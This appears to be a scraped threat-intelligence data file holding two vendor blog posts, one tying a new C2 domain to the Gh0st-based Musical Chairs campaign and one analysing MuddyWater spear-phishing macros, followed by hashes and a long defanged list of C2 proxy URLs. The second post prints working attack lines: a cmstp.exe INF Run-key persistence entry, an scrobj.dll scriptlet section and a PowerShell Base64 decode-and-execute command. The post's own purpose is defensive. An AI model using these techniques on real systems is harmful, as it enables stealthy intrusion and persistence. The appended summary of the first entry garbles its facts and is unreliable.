https://www.netscout.com/blog/asert/musical-chairs-playing-tetris;Musical Chairs Playing Tetris;"February 20, 2018: This blog has been amended since it was originally published on February 15, 2018. This version removes the association with the APT group responsible for the Night Dragon campaign that we had incorrectly made. We thank the research team at Palo Alto Networks for graciously bringing this to our attention.IntroductionASERT has discovered new command-and-control infrastructure controlled by the actors behind the Musical Chairs campaign. The actors are known for the longevity of their C2 domains, reusing them long after they have been identified, and for making use of a popular opened sourced RAT called Gh0st. Uniquely in our observation, they have even embedded a fully-functional version of the game Tetris that will launch only when a special condition is meet.Key FindingsASERT has discovered a new domain associated with the actors behind the Musical Chairs campaign.This long-standing actor is known for maintaining static command-and-control infrastructure such as domains for long periods of time, even when they have been discovered and widely publicized in the community.With moderate confidence, ASERT expects this domain to be used in new intrusions.Multiplearticles have been written about Gh0st over the years, including this one discussing the Musical Chairs campaign's use of this RAT. Using details from that report, ASERT has identified a new sample and more interestingly, a new domain that we have associated with the corresponding actor. The sample appears to be delivered via an email according to artifacts provided by malware-traffic-analysis, which is consistent with documented tactics for this group.Gh0st variants are prolific as they can be found in a popular open-source source code repository - this blog provides the basis for our association with the actor.AnalysisMalwareExample of this Gh0st's init/login packet (notice 'aaaaabbbbb' which can be used to identify this variant):Some other behavior of interest observed while reviewing this actor's specimen is they appear to be moving away from BAT and JS files as part of the infection process[i] to using DLL side loading. This is just one sample though, so take this for what it is. As part of the DLL side-loading, they make use of a signed executable to load a DLL which in turn is used to launch the actual Gh0st DLL. They are not the only malware authors who use this trick.The observed functionality in this sample maps directly to public documentation for Gh0st, so this blog will not rehash that.Association No. 1Starting with the known C2 servers for this group, we can check to see if the new domain has any ties to them. Two of their C2s were registered back in 2013 and the campaign has been around even longer than that perKnown Domainsyourbroiler[.]commeitanjiaoyiwang[.]comNew Domainetybh[.]comLooking at DomainTools, we learn that all three share the same IP, 45.34.148.126, and the same registrar, Jiangsu Bangning Science & Technology Co. LTD. The newest domain, etybh[.]com, was registered in December of 2017. Looking at PassiveTotal, all three domains appeared to have switched from 98.126.223.218 to 45.34.148.146 sometime in the middle of January 2018. This is our first clue that they are related.Association No. 2This one comes from looking at behavior when the file is attached to a debugger.First, let us back up a step. Observing behaviors of our suspected Musical Chairs Gh0st sample via a sandbox, we see that it creates a folder called ""Win32Tetris"". Let's see if there are any other Gh0st samples that do this as well. Taking a look through ASERT's malware corpus we find this sample, 11fe12bbb479b4562c1f21a74e09b233ed41c41b7c4c0cad73692ff4672fb86a, which also creates that folder. Using clues left by another researcher[ii], we can confirm that this more recent sample is from the Musical Chairs group due to the C2 and some other characteristics we'll go over. The most promising correlation is that this sample's C2 is www.yourbroiler[.]com which is a known C2 for this actor. Next, we find similarities from a different dropped file called C:\microsoft\lib\ki\vv.js whose content reads as such:The content is similar to samples identified back in 2015[iii], which also used rundll32 to call a mystart method. And, finally, this sample makes use of the same mutex tied to this actor's Gh0st variant: dafewewrw. To summarize the pivot sampleProperty Value Load the dll via a script file called C:\microsoft\lib\ki\vv.js Domain www.yourbroiler[.]com Mutex dafewewrwNow that we have confirmed that this sample appears to be a Musical Chairs actor Gh0st variant, let's work the pivot (going to refer to this sample as the ""pivot"" sample). The pivot sample, when attached to a debugger, will launch what appears to be a fully functional Tetris game (very friendly of them to provide us reverse engineers with a short break):The latest sample (the one tied to the new domain, etybh[.]com) also exhibits this same behavior when attached to the debugger. To play the game make sure to not hide the PEB. For what it is worth, after checking out one of the prior samples from 2015[iv], it exhibited similar behavior; just not a Tetris game.Association No. 3The final observation is the fact that the payload dropped on the file system as RasTls.dat is in fact an obfuscated DLL file. When looking at the DLL properties the mystart function is exported. Again, mystart is the exported DLL function which the samples back in 2015 called.ConclusionWhile it should not surprise us when a long-standing actor switches things up, this specific actor is known for not really changing much. The use of a different Gh0st variant in addition to the new domain may be indicative of additional changes coming or the actor may be just keeping up with the times. Given previously observed behavior, it is likely that this indicator will be used in the campaign for the foreseeable future and ASERT is making it available to enable visibility for the broader security research community.[i]https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult…[ii]https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult…[iii]https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult…[iv] Hash: 50f08f0b23fe1123b298cb5158c1ad5a8244ce272ea463a1e4858d12719b337f";The actor is likely using Gh0st variant and APT to maintain access over long periods of time. The domains 98.126.223.218 and etybh[.]com are associated and may have a possible pivot. Further investigation is required to determine the specific intent and purpose behind this behavior.;en;
https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign;Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign;"IntroductionFrom January 2018 to March 2018, through FireEye’s Dynamic Threat Intelligence, we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro-based documents to individuals in Asia and the Middle East.We attribute this activity to TEMP.Zagros (reported by Palo Alto Networks and Trend Micro as MuddyWater), an Iran-nexus actor that has been active since at least May 2017. This actor has engaged in prolific spear phishing of government and defense entities in Central and Southwest Asia. The spear phishing emails and attached malicious macro documents typically have geopolitical themes. When successfully executed, the malicious documents install a backdoor we track as POWERSTATS.One of the more interesting observations during the analysis of these files was the re-use of the latest AppLocker bypass, and lateral movement techniques for the purpose of indirect code execution. The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system.Campaign TimelineIn this campaign, the threat actor’s tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1.Figure 1: Timeline of this recently observed spear phishing campaignThe first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macro-based document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2.Figure 2: Process chain for the first part of the campaignAlthough the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3.Figure 3: VBS invoking PowerShell via MSHTAThe second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog.Infection VectorWe believe the infection vector for all of the attacks involved in this campaign are macro-based documents sent as an email attachment. One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4.Figure 4: Sample spear phishing email containing macro-based document attachmentThe malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India. What follows is four examples, and a complete list is available in the Indicators of Compromise section at the end of the blog.Figure 5 shows a document purporting to be from the National Assembly of Pakistan.Figure 5: Document purporting to be from the National Assembly of PakistanA document purporting to be from the Turkish Armed Forces, with content written in the Turkish language, is shown in Figure 6.Figure 6: Document purporting to be from the Turkish Armed ForcesA document purporting to be from the Institute for Development and Research in Banking Technology (established by the Reserve Bank of India) is shown in Figure 7.Figure 7: Document purporting to be from the Institute for Development and Research in Banking TechnologyFigure 8 shows a document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan.Figure 8: Document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of TajikistanEach of these macro-based documents used similar techniques for code execution, persistence and communication with the command and control (C2) server.Indirect Code Execution Through INF and SCTThis scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018. The threat group in this recently observed campaign – TEMP.Zagros – weaponized their malware using the following techniques.The macro in the Word document drops three files in a hard coded path: C:\programdata. Since the path is hard coded, the execution will only be observed in operating systems, Windows 7 and above. The following are the three files:Defender.sct – The malicious JavaScript based scriptlet file.– The malicious JavaScript based scriptlet file. DefenderService.inf – The INF file that is used to invoke the above scriptlet file.– The INF file that is used to invoke the above scriptlet file. WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script.After dropping the three files, the macro will set the following registry key to achieve persistence:\REGISTRY\USER\SID\Software\Microsoft\Windows\CurrentVersion\Run\""WindowsDefenderUpdater"" = cmstp.exe /s c:\programdata\DefenderService.infUpon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. This is possible because inside the INF file we have the following section:[UnRegisterOCXSection]%11%\scrobj.dll,NI,c:/programdata/Defender.sctThat section gets indirectly invoked through the DefaultInstall_SingleUser section of INF, as shown in Figure 9.Figure 9: Indirectly invoking SCT through the DefaultInstall_SingleUser section of INFThis method of code execution is performed in an attempt to evade security products. FireEye MVX and HX Endpoint Security technology successfully detect this code execution technique.SCT File AnalysisThe code of the Defender.sct file is an obfuscated JavaScript. The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line:powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)The rest of the malicious activities are performed by the PowerShell Script.PowerShell File AnalysisThe PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools.Some of the key obfuscation techniques used are:Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult.Figure 10: Character replacement and string reversing techniquesPowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as “IEX” using environment variables. Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')Nowadays, malware authors commonly mask critical strings such as “IEX” using environment variables. Some of the instances used in this script are: XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11.Figure 11: PowerShell script is XOR encoded using a single byte keyAfter deobfuscating the contents of the PowerShell Script, we can divide it into three sections.Section 1The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:TEMpPAtH = ""C:\ProgramData\"" (the path used for storing the temp files)Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine)FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code)PRIVAtE = Private Key exponentsPUbLIc = Public Key exponentsHklm = ""HKLM:\Software\""Hkcu = ""HKCU:\Software\""ValuE = ""kaspersky""SYSIDDrAGon_MidDLe = [array of proxy URLs]Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12.Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 serverSection 2The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server. The algorithm used for encryption and decryption is RSA, which leverages the public and private key exponents included in Section 1 of the PowerShell script.Section 3The third section of the PowerShell script is the biggest section and has a wide variety of functionalities.During analysis, we observed a code section where a message written in Chinese and hard coded in the script will be printed in the case of an error while connecting to the C2 server:The English translation for this message is: “Cannot connect to website, please wait for dragon”.Other functionalities provided by this section of the PowerShell Script are as follows:Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name UsernameAll of this data is concatenated and formatted as shown in Figure 13.Figure 13: Concatenated and formatted data retrieved by PowerShell scriptRegister the victim’s machine to the C2 server by sending the REGISTER command to the server. In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim’s machine and the C2 server.While sending to the C2 server, the data is formatted as follows:@{SYSINFO = $get.ToString(); ACTION = ""REGISTER"";}Ability to take screenshots.Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14.Figure 14: System shut down upon discovery of security toolsAbility to receive PowerShell script from the C2 server and execute on the machine. Several techniques are employed for executing the PowerShell code: If command starts with “excel”, then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:If the command starts with “outlook”, then it leverages Outlook.Application and MSHTA to execute the code:If the command starts with “risk”, then execution is performed through DCOM object:File upload functionality.Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPVFigure 15: Disabling Microsoft Office Protected ViewAbility to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16.Figure 16: Reboot, shut down and clean commandsAbility to sleep for a given number of seconds.The following table summarizes the main C2 commands supported by this PowerShell Script.C2 Command Purpose reboot Reboot the system using shutdown command shutdown Shut down the system using shutdown command clean Wipe the Drives, C:\, D:\, E:\, F:\ screenshot Take a screenshot of the System upload Encrypt and upload the information from the system excel Leverage Excel.Application COM object for code execution outlook Leverage Outlook.Application COM object for code execution risk Leverage DCOM object for code executionConclusionThis activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware. By combining multiple layers of obfuscation, they deter the process of reverse engineering and also attempt to evade security products.Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.Indicators of CompromiseMacro based Documents and HashesSHA256 Hash Filename Targeted Region eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894 na.doc Pakistan 76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338 Invest in Turkey.doc Turkey 6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac güvenlik yönergesi. .doc Turkey 009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0 idrbt.doc India 18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6 Türkiye Cumhuriyeti Kimlik Kart?.doc Turkey 3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb Turkish Armed Forces.doc Turkey 9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c na.gov.pk.doc Pakistan 3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115 MVD-FORM-1800.doc Tajikistan cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88 KEGM-CyberAttack.doc Turkey 1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942 IL-1801.doc Turkey aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627 kiyiemniyeti.doc Turkey 93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84 TCELL-S1-M.doc Tajikistan c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9 egm-1.doc Turkey 2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13 Connectel .pk.doc Pakistan 18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd gÃŸvenlik_yÃœnergesi_.doc Turkey 153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58 MIT.doc Turkey d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025 Gvenlik Ynergesi.doc Turkey af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102 Gvenlik Ynergesi.doc Turkey 5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af NA Turkey 3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c Anadolu GÃ¼neydoÄŸu Projesinde .doc TurkeyNetwork IndicatorsList of Proxy URLshxxp://alessandrofoglino[.]com//db_template.phphxxp://www.easy-home-sales[.]co.za//db_template.phphxxp://www.almaarefut[.]com/admin/db_template.phphxxp://chinamall[.]co.za//db_template.phphxxp://amesoulcoaching[.]com//db_template.phphxxp://www.antigonisworld[.]com/wp-includes/db_template.phphxxps://anbinni.ba/wp-admin/db_template.phphxxp://arctistrade[.]de/wp/db_template.phphxxp://aianalytics[.]ie//db_template.phphxxp://www.gilforsenate[.]com//db_template.phphxxp://mgamule[.]co.za/oldweb/db_template.phphxxp://chrisdejager-attorneys[.]co.za//db_template.phphxxp://alfredocifuentes[.]com//db_template.phphxxp://alxcorp[.]com//db_template.phphxxps://www.aircafe24[.]com//db_template.phphxxp://agencereferencement.be/wp-admin/db_template.phphxxp://americanlegacies[.]org/webthed_ftw/db_template.phphxxps://aloefly[.]net//db_template.phphxxp://www.duotonedigital[.]co.za//db_template.phphxxp://architectsinc[.]net//db_template.phphxxp://www.tanati[.]co.za//db_template.phphxxp://emware[.]co.za//db_template.phphxxp://breastfeedingbra[.]co.za//db_template.phphxxp://alhidayahfoundation[.]co[.]uk/category/db_template.phphxxp://cashforyousa[.]co.za//db_template.phphxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.phphxxp://antjetaubert[.]de//db_template.phphxxp://hesterwebber[.]co.za//db_template.phphxxp://fickstarelectrical[.]co.za//db_template.phphxxp://alex-frost[.]com/assets/db_template.phphxxps://americanbrasil[.]com.br//db_template.phphxxps://aileeshop[.]com//db_template.phphxxps://annodle[.]com//db_template.phphxxp://goldeninstitute[.]co.za/contents/db_template.phphxxp://ednpk[.]com//db_template.phphxxp://www.arabiccasinochoice[.]com//db_template.phphxxp://proeventsports[.]co.za//db_template.phphxxp://glenbridge[.]co.za//db_template.phphxxp://berped[.]co.za//db_template.phphxxp://best-digital-slr-cameras[.]com//db_template.phphxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.phphxxp://www.alpacal[.]com//db_template.phphxxps://www.alakml[.]com/wp-admin/db_template.phphxxp://ar-rihla[.]com//db_template.phphxxp://appsvoice[.]info//db_template.phphxxp://www.bashancorp[.]co.za//db_template.phphxxp://alexanderbecker[.]net/services/db_template.phphxxp://visionclinic.co.ls/visionclinic/db_template.phphxxps://www.angelesrevista[.]com//db_template.phphxxps://www.antojoentucocina[.]com//db_template.phphxxp://apollonweb[.]com//db_template.phphxxps://www.alphapixa[.]com//db_template.phphxxp://capitalradiopetition[.]co.za//db_template.phphxxp://www.generictoners[.]co.za//db_template.phphxxps://alnahdatraining[.]com//db_template.phphxxps://albousala[.]com//db_template.phphxxps://www.dopetroleum[.]com//db_template.phphxxp://bios-chip[.]co.za//db_template.phphxxp://www.crissamconsulting[.]co.za//db_template.phphxxp://capriflower[.]co.za//db_template.phphxxp://www.dingaanassociates[.]co.za//db_template.phphxxp://indiba-africa[.]co.za//db_template.phphxxp://verifiedseller[.]co.za/js/db_template.phphxxps://www.buraqlubricant[.]com//db_template.phphxxp://aqarco[.]com/wp-admin/db_template.phphxxp://allaboutblockchain[.]net//db_template.phphxxp://www.amexcars[.]info/tpl/db_template.phphxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.phphxxp://bakron[.]co.za//db_template.phphxxp://gsnconsulting[.]co.za//db_template.phphxxp://vumavaluations[.]co.za//db_template.phphxxp://heritagetravelmw[.]com//db_template.phphxxp://ampvita[.]com//db_template.phphxxp://ahero-resource-center[.]org/administrator/db_template.phphxxps://arbulario[.]com//db_template.phphxxp://havilahglo[.]co.za/wpscripts/db_template.phphxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.phphxxp://delectronics[.]com[.]pk//db_template.phphxxp://antucomp[.]com//db_template.phphxxp://advocatetn[.]com/font-awesome/fonts/db_template.phphxxps://amooy[.]com/webservice/db_template.phphxxp://www.harmonyguesthouse[.]co.za//db_template.phphxxp://alanrori[.]com//db_template.phphxxp://algarvesup[.]com//db_template.phphxxp://desirablehair[.]co.za//db_template.phphxxp://comsip[.]org.mw//db_template.phphxxp://jdcorporate[.]co.za/catalog/db_template.phphxxp://andrewfinnburhoe[.]com//db_template.phphxxp://anyeva[.]com/wp-includes/db_template.phphxxp://www.agenceuhd[.]com//db_template.phphxxp://host4unix[.]net/host24new/db_template.phphxxp://www.altaica[.]ca/wordpress/db_template.phphxxp://www.allbuyer[.]co[.]uk//db_template.phphxxp://jvpsfunerals[.]co.za//db_template.phphxxp://immaculatepainters[.]co.za//db_template.phphxxp://tcpbereka[.]co.za/js/db_template.phphxxp://clientcare.co.ls//db_template.phphxxp://investaholdings[.]co.za/htc/db_template.phphxxp://www.amjobs[.]co[.]uk//db_template.phphxxp://www.agirlgonewine[.]com/store/db_template.phphxxp://findinfo-more[.]com//db_template.phphxxp://asgen[.]org//db_template.phphxxp://alphasalesrecruitment[.]com//db_template.phphxxp://irshadfoundation[.]co.za//db_template.phphxxp://analternatif[.]com/includes/db_template.phphxxp://arbruisseau[.]com/profiles/db_template.phphxxp://ladiescircle[.]co.za//db_template.phphxxp://all-reseller[.]com/zzz_backup/db_template.phphxxp://alcatrazmoon[.]com/images/db_template.phphxxp://www.alcalumni[.]com/wp-includes/db_template.phphxxp://aniljoseph[.]com/servermon/db_template.phphxxp://alwake3press[.]com/wp-includes/db_template.phphxxp://www.hfhl[.]org.ls/habitat/db_template.phphxxp://alcafricanos[.]com/slsmonographs/db_template.phphxxps://agapeencounter[.]org//db_template.phphxxp://apobiomedix[.]ca//db_template.phphxxp://anythinglah[.]info//db_template.phphxxp://aniroleplay[.]net//db_template.phphxxp://www.allcopytoners[.]com//db_template.phphxxp://alphaobring[.]com//db_template.phphxxp://www.galwayprimary[.]co.za//db_template.phphxxp://alnuzha[.]org/en/db_template.phphxxps://ancient-wisdoms[.]com//db_template.phphxxp://amazingenergysavings[.]net//db_template.phphxxp://gvs[.]com[.]pk/font-awesome/db_template.phphxxp://geetransfers[.]co.za/font-awesome/db_template.phphxxp://carlagrobler[.]co.za/components/db_template.phphxxp://amazingashwini[.]com//db_template.phphxxp://aminearserver[.]es//db_template.phphxxp://lensofafrica[.]co.za//db_template.phphxxp://greenacrestf[.]co.za/video/db_template.phphxxp://www.tonaro[.]co.za//db_template.phphxxp://alephit2[.]biz/kitzz/db_template.phphxxp://lppaportal[.]org.ls//db_template.phphxxp://alkousy[.]com//db_template.phphxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.phphxxp://fragranceoil[.]co.za//db_template.phphxxp://www.eloquent[.]co.za/nweb2/db_template.phphxxp://chrishanicdc[.]org/wpimages/db_template.phphxxp://ahc.me[.]uk//db_template.phphxxp://www.britishasia-equip[.]co[.]uk//db_template.phphxxp://always-beauty[.]ch//db_template.phphxxps://www.ancamamara[.]com/wp-admin/db_template.phphxxp://entracorntrading[.]co.za//db_template.phphxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.phphxxp://americabr[.]com.br//db_template.phphxxp://andrew-snyder[.]net/bootstrap/db_template.phphxxp://signsoftime[.]co.za//db_template.phphxxp://aperta-armis[.]org//db_template.phphxxp://absfinancialplanning[.]co.za/images/db_template.phphxxp://charispaarl[.]co.za//db_template.phphxxp://indlovusecurity[.]co.za//db_template.phphxxp://alcafricandatalab[.]com//db_template.phphxxp://amor-clubhotels[.]com//db_template.phphxxp://mokorotlocorporate[.]com//db_template.phphxxp://apppriori[.]com//db_template.phphxxp://luxconprojects[.]co.za//db_template.phphxxp://androidphonetips[.]com/wp-includes/db_template.phphxxp://angel-seeds[.]com.ua/catalog/db_template.phphxxp://alissanicolai[.]com/assets/db_template.phphxxps://www.amateurastronomy[.]org//db_template.phphxxp://aiofotoevideo[.]com//db_template.phphxxp://www.amika.hr//db_template.phphxxp://comfortex[.]co.za/php/db_template.phphxxp://deepgraphics[.]co.za//db_template.phphxxps://agiledepot[.]com//db_template.phphxxp://almatours[.]gr//db_template.phphxxp://analystcnwang[.]com//db_template.phphxxp://www.malboer[.]co.za/trendy1/db_template.phphxxp://sefikengfarm.co.ls//db_template.phphxxp://www.antirughenaturale[.]com/wp-admin/db_template.phphxxp://passright[.]co.za//db_template.phphxxp://seismicfactory[.]co.za//db_template.phphxxp://alessandroalessandrini[.]it//db_template.phphxxps://aquabsafe[.]com//db_template.phphxxp://amatikulutours[.]com/tmp/db_template.phphxxp://ganitis[.]gr//db_template.phphxxp://aleenasgiftbox[.]com/admin/db_template.phphxxps://allusdoctors[.]com/themes/db_template.phphxxp://alainsaffel[.]com//db_template.phphxxp://www.ariehandomri[.]com//db_template.phphxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.phphxxp://itengineering[.]co.za/gatewaydiamond/db_template.phphxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.phphxxp://www.albertamechanical[.]ca//db_template.phphxxp://alchamel[.]info//db_template.phphxxps://almokan[.]net/wp-includes/db_template.phphxxp://jakobieducation[.]co.za//db_template.phphxxps://arc-sec[.]net//db_template.phphxxp://ldams[.]org.ls/supplies/db_template.phphxxp://menaboracks[.]co.za/tmp/db_template.phphxxp://www.getcord[.]co.za//db_template.phphxxp://boardaffairs[.]com//db_template.phphxxp://capetownway[.]co.za//db_template.phphxxp://cloudhostdesign[.]com//db_template.phphxxp://hartenboswaterpark[.]co.za/templates/db_template.phphxxp://fccorp[.]co.za/php/db_template.phphxxp://angar68[.]com//db_template.phphxxp://www.dws-gov[.]co.za//db_template.phphxxp://alwahahweb[.]com//db_template.phphxxp://anuragcreatives[.]com//db_template.phphxxp://embali[.]co.za//db_template.phphxxp://albertaedmonton[.]com/widgetstyles/db_template.phphxxp://altosdefontana[.]com//db_template.phphxxp://airfanhydro[.]net//db_template.phphxxps://www.alexponcet[.]com/wp-includes/db_template.phphxxp://agropecuariavilarica[.]com.br//db_template.phphxxps://www.amazingbuyrd[.]com/admin/db_template.phphxxp://cdxtrading[.]co.za//db_template.phphxxp://interafricaconsulting[.]com/wpimages/db_template.phphxxp://glgroup[.]co.za/images/db_template.phphxxp://hisandherskennels[.]co.za/php/db_template.phphxxp://alemaohost[.]com/lotosorg[.]com/db_template.phphxxp://isibaniedu[.]co.za/admin/db_template.phphxxp://dianakleyn[.]co.za/layouts/db_template.phphxxp://themotoringcalendar[.]co.za//db_template.phphxxp://www.loansonhomes[.]co.za//db_template.phphxxp://edgesecurity[.]co.za/js/db_template.phphxxp://highschoolsuperstar[.]co.za/files/db_template.phphxxp://www.ambientproperty[.]com//db_template.phphxxp://animationshowreel[.]co.il//db_template.phphxxp://cafawelding[.]co.za/font-awesome/db_template.phphxxp://apalawyers.pt//db_template.phphxxp://www.edesignz[.]co.za//db_template.phphxxp://centuryacademy[.]co.za/css/db_template.phphxxps://ambyenta.hr//db_template.phphxxp://ceramica[.]co.za//db_template.phphxxp://www.alfredoposada[.]com//db_template.phphxxp://anastasovsworkshop[.]com/wp-includes/db_template.phphxxp://allisonplumbing[.]com/wp-includes/db_template.phphxxp://eastrandmotorlab[.]co.za/fleet/db_template.phphxxp://angelsongroup[.]com/wp-includes/db_template.phphxxp://www.mikimaths[.]com//db_template.phphxxp://hjb-racing[.]co.za/htdocs/db_template.phphxxp://anotherpartofme[.]com/wp-includes/db_template.phphxxp://www.andreabelfi[.]com//db_template.phphxxp://www.iancullen[.]co.za//db_template.phphxxp://alaskamaterials[.]com//db_template.phphxxp://jeanetteproperties[.]co.za//db_template.phphxxp://www.digitalmedia[.]co.za//db_template.phphxxp://www.rejoicetheatre[.]com//db_template.phphxxps://alterwebhost[.]com//db_template.phphxxp://bc-u[.]co[.]uk//db_template.phphxxp://dpscdgkhan.edu[.]pk/shopping/db_template.phphxxp://edgeforensic[.]co.za//db_template.phphxxp://willpowerpos[.]co.za//db_template.phphxxp://antrismode[.]com/wp-includes/db_template.phphxxp://colenesphotography[.]co.za/modules/db_template.phphxxp://anthaigroup.vn//db_template.phphxxps://alphainvestors[.]com.au//db_template.phphxxps://aliart[.]nl//db_template.phphxxps://allmantravel[.]com/thumbs/db_template.phphxxp://fbrvolume[.]co.za//db_template.phphxxp://amordegato[.]es/storefront/db_template.phphxxp://agylub[.]com//db_template.phphxxp://www.khotsonglodge.co.ls//db_template.phphxxp://ampli5yd[.]com//db_template.phphxxps://animeok[.]co.il//db_template.phphxxps://arbeidsrechtcentrum[.]nl//db_template.phphxxp://erniecommunications[.]co.za/js/db_template.phphxxp://promechtransport[.]co.za/scripts/db_template.phphxxp://centuriongsd[.]co.za//db_template.phphxxp://www.agencesylvieleclerc[.]com//db_template.phphxxp://delcom[.]co.za//db_template.phphxxps://aleoestudio[.]com/gallonature/db_template.phphxxp://oftheearthphotography[.]com/www/db_template.phphxxp://h-dubepromotions[.]co.za//db_template.phphxxp://www.alessioborzuola[.]com/downloads/db_template.phphxxp://crystaltidings[.]co.za//db_template.phphxxp://funeralbusinesssolution[.]com/email_template/db_template.phphxxp://funisalodge[.]co.za/data1/db_template.phphxxp://experttutors[.]co.za//db_template.phphxxps://www[.]cartridgecave[.]co.za//db_template.phphxxp://ecs-consult[.]com//db_template.phphxxp://www.animationinisrael[.]org/tmp_images/db_template.phphxxp://gideonitesprojects[.]com//db_template.phphxxp://hybridauto[.]co.za/photography/db_template.phphxxp://africanpixels.zar.cc//db_template.phphxxp://ryanchristiefurniture[.]co.za//db_template.phphxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.phphxxp://almeriahotelja[.]com/dk/db_template.phphxxp://al3abflash[.]biz//db_template.phphxxp://www.fun4kidz[.]co.za//db_template.phphxxp://alsharhanstore[.]com//db_template.phphxxp://www[.]infratechconsulting[.]com//db_template.phphxxp://algihad[.]com/assets/db_template.phphxxp://americanwestmedia[.]com//db_template.phphxxp://charliewestsecurity[.]co.za//db_template.phphxxp://beehiveholdingszar[.]co.za//db_template.phphxxp://analyticalfootball[.]com//db_template.phphxxp://apiiination[.]com/leadership/db_template.phphxxps://ahelicoptermom[.]com/wp-includes/db_template.phphxxp://servicebox[.]co.za//db_template.phphxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.phphxxps://aquo[.]in//db_template.phphxxps://www.alfransia[.]com/wp-admin/db_template.phphxxp